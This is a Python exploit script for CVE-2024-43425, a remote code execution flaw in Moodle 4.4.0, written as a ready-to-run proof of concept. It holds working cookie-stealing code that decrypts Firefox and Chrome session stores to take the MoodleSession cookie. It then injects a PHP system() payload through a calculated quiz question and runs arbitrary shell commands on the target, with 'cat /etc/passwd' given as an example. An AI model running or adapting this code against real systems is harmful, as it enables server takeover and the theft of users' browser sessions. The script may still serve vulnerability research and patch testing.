# Exploit Title: Moodle 4.4.0 - Authenticated Remote Code Execution
# Vendor Homepage: https://moodle.org
# Software Link: https://github.com/moodle/moodle/releases/tag/v4.4.0
# Tested Version: Moodle 4.4.0
# Affected versions: 4.4 to 4.4.1, 4.3 to 4.3.5, 4.2 to 4.2.8, 4.1 to 4.1.11
# Tested On: Ubuntu 24.04, Apache2, PHP 8.2
# CVE: CVE-2024-43425
# References:
# - https://github.com/aninfosec/CVE-2024-43425-Poc
# - https://nvd.nist.gov/vuln/detail/CVE-2024-43425

import argparse
import requests
import re
import sys
import urllib.parse
import lz4.block
import json
import os
import configparser
from Crypto.Cipher import AES
import win32crypt
import sqlite3
import base64
import time

requests.packages.urllib3.disable_warnings()
#############################
#   Firefox cookie stealer  #
#############################

# It works, but for windows it takes the "default profile" -> this could be a problem
def get_firefox_profile_address():
    # Standard Firefox profile location
    if os.name == "nt":
        profiles_ini = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "profiles.ini")
    else:
        profiles_ini_paths = [
            os.path.expanduser("~/.mozilla/firefox/profiles.ini"),
            os.path.expanduser("~/snap/firefox/common/.mozilla/firefox/profiles.ini"),
        ]
        profiles_ini = None

        # Detect which profiles.ini exists (normal or snap)
        for p in profiles_ini_paths:
            if os.path.exists(p):
                profiles_ini = p
                break
       
    if not os.path.exists(profiles_ini):
        raise FileNotFoundError("profiles.ini not found — is Firefox installed?")

    config = configparser.ConfigParser()
    config.read(profiles_ini)

    # Search for the default profile
    for section in config.sections():
        if config.has_option(section, "Default") and config.get(section, "Default") == "1":
            path = config.get(section, "Path")
            is_relative = config.get(section, "IsRelative") == "1"

            if is_relative:
                base = os.path.dirname(profiles_ini)
                full_path = os.path.join(base, path)
            else:
                full_path = path

            return os.path.abspath(full_path)

    raise RuntimeError("No default Firefox profile found in profiles.ini")

def get_firefox_session_cookie():
    # Ruta a tu archivo recovery.jsonlz4

    profile_path = get_firefox_profile_address()
    if os.name == "nt":
        file_name = "sessionstore-backups\\recovery.jsonlz4"
    else:
        file_name = "sessionstore-backups/recovery.jsonlz4"
    input_file = os.path.join(profile_path, file_name)

    with open(input_file, "rb") as f:
        data = f.read()

    # Firefox agrega 'mozLz40' al inicio; lo quitamos
    if data[:8] != b"mozLz40\0":
        raise ValueError("No parece ser un archivo Firefox LZ4 válido")
    lz4_data = data[8:]

    # Descomprimir
    decompressed = lz4.block.decompress(lz4_data)
    # Decodificar bytes a string y cargar JSON
    recovery_json = json.loads(decompressed.decode("utf-8"))
    # --- BÚSQUEDA RECURSIVA ---
    def buscar_cookie(obj, name):
        if isinstance(obj, dict):
            # Si el objeto tiene 'name', podría ser una cookie
            if obj.get("name") == name:
                return obj
            # Recorremos recursivamente
            for v in obj.values():
                res = buscar_cookie(v, name)
                if res:
                    return res

        elif isinstance(obj, list):
            for item in obj:
                res = buscar_cookie(item, name)
                if res:
                    return res

        return None

    cookie = buscar_cookie(recovery_json, "MoodleSession")

    if cookie:
        print("[*] Step 1: Cookie MoodleSession found:")
        #print(cookie)
    else:
        print("[-] Step 1: Cookie MoodleSession NOT found.")

    return cookie

############################
#   Chorme cookie stealer  #
############################

chromePath = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 
                          'Chrome', 'User Data')
localStatePath = os.path.join(chromePath, 'Local State')
cookiesPath = os.path.join(chromePath, 'Default', 'Network', 'Cookies')

def getChromeEncryptionKey():
    try:
        with open(localStatePath, 'r', encoding='utf-8') as file:
            localStateData = json.load(file)
            encryptedKey = localStateData['os_crypt']['encrypted_key']
            keyData = base64.b64decode(encryptedKey.encode('utf-8'))
            return win32crypt.CryptUnprotectData(keyData[5:], None, None, None, 0)[1]
    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        
        raise FileNotFoundError(f"Error reading the Local State file: {e}")

        #print(f"Error reading the Local State file: {e}")
        #exit(0)

def get_Chrome_session_cookie():
    key = getChromeEncryptionKey()

    conn = sqlite3.connect(cookiesPath)
    cursor = conn.cursor()
    cursor.execute("""SELECT host_key, name, value, encrypted_value, path FROM cookies""")

    session_cookie = None
    for host_key, name, value, encrypted_value, path in cursor.fetchall():
        if not value:
            if isinstance(encrypted_value, str):
                encrypted_value = bytes(encrypted_value, "utf-8")
            value = AES.new(key, AES.MODE_GCM, encrypted_value[3:15]).decrypt(encrypted_value[15:-16]).decode()
        if name == "MoodleSession":
            session_cookie = {
                "name": name,
                "value": value,
                "host": host_key,
                "path" : path
            }

    return session_cookie

################################
#   Moodle CVE-2024-43425 RCE  #
################################

def get_quiz_info(session, base_url, cmid):
    print("[*] Extracting sesskey, courseContextId, and category from quiz edit page...")
    quiz_edit_url = f"{base_url}/mod/quiz/edit.php?cmid={cmid}"
    try:
        resp = session.get(quiz_edit_url, verify=False)
        if resp.status_code != 200:
            print(f"[-] Failed to load quiz edit page. Status: {resp.status_code}")
            sys.exit(1)
        # Extract sesskey
        sesskey_match = re.search(r'"sesskey":"([a-zA-Z0-9]+)"', resp.text)
        # Extract courseContextId
        ctxid_match = re.search(r'"courseContextId":(\d+)', resp.text)
        # Extract category
        category_match = re.search(r';category=(\d+)', resp.text)
        if not (sesskey_match and ctxid_match and category_match):
            print("[-] Could not extract sesskey, courseContextId, or category")
            print(resp.text[:1000])
            sys.exit(1)
        sesskey = sesskey_match.group(1)
        ctxid = ctxid_match.group(1)
        category = category_match.group(1)
        print(f"[+] Found sesskey: {sesskey}")
        print(f"[+] Found courseContextId: {ctxid}")
        print(f"[+] Found category: {category}")
        return sesskey, ctxid, category
    except Exception as e:
        print(f"[-] Exception while extracting quiz info: {e}")
        sys.exit(1)

def upload_calculated_question(session, base_url, sesskey, cmid, courseid, category, ctxid):
    print("[*] Step 3: Uploading calculated question with payload...")
    url = f"{base_url}/question/bank/editquestion/question.php"
    payload = "(1)->{system($_GET[chr(97)])}"
    post_data = {
        "initialcategory": 1,
        "reload": 1,
        "shuffleanswers": 1,
        "answernumbering": "abc",
        "mform_isexpanded_id_answerhdr": 1,
        "noanswers": 1,
        "nounits": 1,
        "numhints": 2,
        "synchronize": "",
        "wizard": "datasetdefinitions",
        "id": "",
        "inpopup": 0,
        "cmid": cmid,
        "courseid": courseid,
        "returnurl": f"/mod/quiz/edit.php?cmid={cmid}&addonpage=0",
        "mdlscrollto": 0,
        "appendqnumstring": "addquestion",
        "qtype": "calculated",
        "makecopy": 0,
        "sesskey": sesskey,
        "_qf__qtype_calculated_edit_form": 1,
        "mform_isexpanded_id_generalheader": 1,
        "category": f"{category},{ctxid}",
        "name": "exploit",
        "questiontext[text]": "<p>test</p>",
        "questiontext[format]": 1,
        "questiontext[itemid]": 623548580,
        "status": "ready",
        "defaultmark": 1,
        "generalfeedback[text]": "",
        "generalfeedback[format]": 1,
        "generalfeedback[itemid]": 21978947,
        "answer[0]": payload,
        "fraction[0]": 1.0,
        "tolerance[0]": 0.01,
        "tolerancetype[0]": 1,
        "correctanswerlength[0]": 2,
        "correctanswerformat[0]": 1,
        "feedback[0][text]": "",
        "feedback[0][format]": 1,
        "feedback[0][itemid]": 281384971,
        "unitrole": 3,
        "penalty": 0.3333333,
        "hint[0][text]": "",
        "hint[0][format]": 1,
        "hint[0][itemid]": 812786292,
        "hint[1][text]": "",
        "hint[1][format]": 1,
        "hint[1][itemid]": 795720000,
        "tags": "_qf__force_multiselect_submission",
        "submitbutton": "Save changes"
    }
    try:
        res = session.post(url, data=post_data, verify=False, allow_redirects=False)
        if res.status_code in [302, 303] and "Location" in res.headers and "&id=" in res.headers["Location"]:
            print("[+] Question upload request sent. Extracting question ID from redirect.")
            qid = re.search(r"&id=(\d+)", res.headers["Location"])
            if not qid:
                print("[-] Could not extract question ID from redirect.")
                sys.exit(1)
            return qid.group(1)
        else:
            print(f"[-] Upload failed. Status code: {res.status_code}")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Upload exception: {e}")
        sys.exit(1)

def post_dataset_wizard(session, base_url, question_id, sesskey, cmid, courseid, category, ctxid):
    print("[*] Step 4: Completing dataset wizard with dataset[0]=0")
    wizard_url = f"{base_url}/question/bank/editquestion/question.php?wizardnow=datasetdefinitions"
    data_payload = {
        "id": question_id,
        "inpopup": 0,
        "cmid": cmid,
        "courseid": courseid,
        "returnurl": f"/mod/quiz/edit.php?cmid={cmid}&addonpage=0",
        "mdlscrollto": 0,
        "appendqnumstring": "addquestion",
        "category": f"{category},{ctxid}",
        "wizard": "datasetitems",
        "sesskey": sesskey,
        "_qf__question_dataset_dependent_definitions_form": 1,
        "dataset[0]": 0,
        "synchronize": 0,
        "submitbutton": "Next page"
    }
    try:
        res = session.post(wizard_url, data=data_payload, verify=False)
        if res.status_code == 200:
            print("[+] Dataset wizard POST submitted.")
            return False
        elif "Exception - system(): Argument #1 ($command) cannot be empty" in res.text:
            print("[+] Reached expected error page. Payload is being interpreted.")
            return True
        else:
            print(f"[-] Dataset wizard POST failed with status: {res.status_code}")
            return False
    except Exception as e:
        print(f"[-] Exception during dataset wizard step: {e}")
        return False

def trigger_rce(session, base_url, question_id, category, cmid, courseid, cmd):
    print("[*] Step 5: Triggering command: {cmd}")
    encoded = urllib.parse.quote(cmd)
    trigger_url = (
        f"{base_url}/question/bank/editquestion/question.php?id={question_id}"
        f"&category={category}&cmid={cmid}&courseid={courseid}"
        f"&wizardnow=datasetitems&returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D{cmid}%26addonpage%3D0"
        f"&appendqnumstring=addquestion&mdlscrollto=0&a={encoded}"
    )
    try:
        resp = session.get(trigger_url, verify=False)
        print("[+] Trigger request sent. Output below:\n")
        lines = resp.text.splitlines()
        output_lines = []
        for line in lines:
            if "<html" in line.lower():
                break
            if line.strip():
                output_lines.append(line.strip())

        print("[+] Command output (top lines):")
        print("\n".join(output_lines[:2]) if output_lines else "[!] No output detected.")
    except Exception as e:
        print(f"[-] Error triggering command: {e}")
        sys.exit(1)

def main():


    parser = argparse.ArgumentParser(description="Moodle CVE-2024-43425 Exploit")
    parser.add_argument("--url", required=True, help="Target Moodle base URL")
    parser.add_argument("--courseid", required=True, help="Course ID")
    parser.add_argument("--cmid", required=True, help="Course Module ID (Quiz)")
    parser.add_argument("--cmd", required=True, help="Command to execute remotely (e.g., 'whoami' or 'cat /etc/passwd')")
    
    try:
        s_cookie = get_firefox_session_cookie()
    except Exception:
        try:
            s_cookie = get_Chrome_session_cookie()
        except Exception:
            raise Exception("No se pudo obtener la cookie de sesión de Firefox ni de Chrome.")

    if s_cookie:
        print(f"[+] Moodle session cookie found: {s_cookie}")
    args = parser.parse_args()

    session = requests.Session()

    # Cargar cookie desde tu diccionario
    session.cookies.set(
        name=s_cookie["name"],
        value=s_cookie["value"],
        domain=s_cookie["host"],
        path=s_cookie["path"]
    )

    sesskey, ctxid, category = get_quiz_info(session, args.url.rstrip('/'), args.cmid)

    question_id = upload_calculated_question(session, args.url.rstrip('/'), sesskey, args.cmid, args.courseid, category, ctxid)

    if not post_dataset_wizard(session, args.url.rstrip('/'), question_id, sesskey, args.cmid, args.courseid, category, ctxid):
        sys.exit(1)

    trigger_rce(session, args.url.rstrip('/'), question_id, category, args.cmid, args.courseid, args.cmd)

if __name__ == "__main__":
    main()
            
